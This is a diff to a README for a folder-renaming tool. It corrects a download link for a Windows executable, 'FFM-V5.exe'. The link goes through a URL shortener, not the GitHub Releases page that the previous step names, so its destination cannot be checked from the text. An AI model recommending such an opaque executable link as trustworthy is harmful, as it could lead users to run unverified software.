@@ -48,7 +48,7 @@ Whether you are an office professional looking for an instant solution or a deve
 ### 🏢 For Office Users (No Installation Required)
 1. Go to the [**Releases**](https://github.com/flute012/deep-folder-ai-renamer/releases) page.
 2. Download the latest standalone executable package directly from the link below:
-   👉 **[Download FFM-V5.exe](https:user150607.pse.is/97bapx)** (Windows standalone package).
+   👉 **[Download FFM-V5.exe](https://user150607.pse.is/97bapx)** (Windows standalone package).
 3. Double-click to launch the UI instantly. *No Python configuration or environment setup needed.*
 
 🎬 **[Watch Demo Video (Part 1)](https://www.youtube.com/watch?v=4H-YTYZgaIY)**
